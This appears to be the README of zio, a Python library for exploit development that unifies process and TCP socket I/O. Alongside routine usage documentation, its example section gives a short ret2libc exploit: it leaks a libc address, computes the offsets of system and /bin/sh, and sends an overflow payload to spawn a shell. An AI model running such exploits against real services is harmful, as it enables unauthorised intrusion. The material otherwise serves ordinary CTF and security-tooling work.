
# zio

[![Build Status](https://travis-ci.org/zTrix/zio.png)](https://travis-ci.org/zTrix/zio) [![support-version](https://img.shields.io/pypi/pyversions/zio)](https://img.shields.io/pypi/pyversions/zio)

[zio] is an easy-to-use io library for pwning development, supporting an unified interface for local process pwning and TCP socket io.

The primary goal of [zio] is to provide unified io interface between process stdin/stdout and TCP socket io. So when you have done local pwning development, you only need to change the io target to pwn the remote server.

The following code illustrate the basic idea.

```python
from zio import *

is_local = True

if is_local:
    io = zio('./buggy-server')            # used for local pwning development
else:
    io = zio(('1.2.3.4', 1337))           # used to exploit remote service

io.read_until(b'Welcome Banner')
io.write(your_awesome_ropchain_or_shellcode)
# hey, we got an interactive shell!
io.interact()
```

## Advantage

 - Self contained single file installation, no extra dependency required. Copy it as you go and fire with no pain even without internet access.
 - Support both python2 and python3, no need to worry about the python version installed on some weired jump server provided by unknown.
 - Easy to learn and use.

If you want advanced features such as ELF parsing and more, try [pwntools](https://github.com/Gallopsled/pwntools).

## License

[zio] use [SATA License](LICENSE.txt) (Star And Thank Author License), so you have to star this project before using. Read the [license](LICENSE.txt) carefully.

## Working Environment

 - Linux or OSX
 - Python 2.6, 2.7, 3.x

for windows support, a minimal version(socket-io only) [mini_zio](./mini_zio.py) is provided.

## Installation

This is a single-file project so in most cases you can just download [zio.py](https://raw.githubusercontent.com/zTrix/zio/master/zio.py) and start using.

pip is also supported, so you can also install by running 

```bash
$ pip install zio
```

## Examples
 
```python
from zio import *

is_local = True

if is_local:
    io = zio('./buggy-server')
else:
    io = zio((pwn.server, 1337))

for i in range(1337):
    io.writeline(b'add ' + str(i))
    io.read_until(b'>>')

io.write(b"add TFpdp1gL4Qu4aVCHUF6AY5Gs7WKCoTYzPv49QSa\ninfo " + b"A" * 49 + b"\nshow\n")
io.read_until(b'A' * 49)
libc_base = l32(io.read(4)) - 0x1a9960
libc_system = libc_base + 0x3ea70
libc_binsh = libc_base + 0x15fcbf
payload = b'A' * 64 + l32(libc_system) + b'JJJJ' + l32(libc_binsh)
io.write(b'info ' + payload + b"\nshow\nexit\n")
io.read_until(b">>")
# We've got a shell;-)
io.interact()
```

## Document

### bytes vs unicode

zio works at `bytes` level. All params and return value should be bytes. (Although some methods support unicode for compatibility and fault tolerance)

The recommended practice is to use b'xxx' everywhere, which is supported by both python2 and python3 without ambiguity.

### about line break and carriage return

Just don't read b'\n' or b'\r', use `read_line()` instead

### example for SSL wrapped socket

```
hostname = 'xxx.com'
host = '111.22.33.44'
port = 31337
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssl_sock = context.wrap_socket(s, server_hostname=hostname)
ssl_sock.connect((host, port))

io = zio(ssl_sock)

...
```

### Play with cmdline

Act like netcat

```
$ printf 'GET / HTTP/1.0\r\n\r\n' | ./zio.py baidu.com 80
```

Unhex

```
$ echo '3334350a' | ./zio.py -d unhex -w none -r none -i pipe -o pipe --show-input=0 cat
345
```

hexcat some file

```
$ cat somefile | ./zio.py -e hex -w none -r none -i pipe -o pipe --show-input=0 cat
```

show file in string repr

```
$ cat somefile | ./zio.py -e repr -w none -r none -i pipe -o pipe --show-input=0 cat
```

log vim key sequences and underlying io

```
$ zio --debug=zio.log vim
```

### Other fun usage

Talk with vim using code.

```
In [1]: from zio import *

In [2]: io = zio('vim', stdin=TTY, stdout=TTY)

In [3]: io.writeline(b'ihello world')
ihello world
Out[3]: 13

In [4]: io.writeline(b'\x1b:w hand_crafted_vim_file.txt')
w hand_crafted_vim_file.txt
Out[4]: 30

In [5]: io.writeline(b':q')
:q
Out[5]: 3

In [6]: io.exit_status()
Out[6]: 0

In [7]: !cat hand_crafted_vim_file.txt
hello world
```

You can even talk with vim for prefix and then interact by hand to continue normal action.

## Thanks (Also references)

 - [pexpect](https://github.com/pexpect/pexpect) borrowed a lot of code from here
 - [sh](https://github.com/amoffat/sh)
 - python subprocess module
 - TTY related
   - http://linux.die.net/man/3/cfmakeraw
   - http://marcocorvi.altervista.org/games/lkpe/tty/tty.htm
   - http://www.linusakesson.net/programming/tty/

[zio]:https://github.com/zTrix/zio
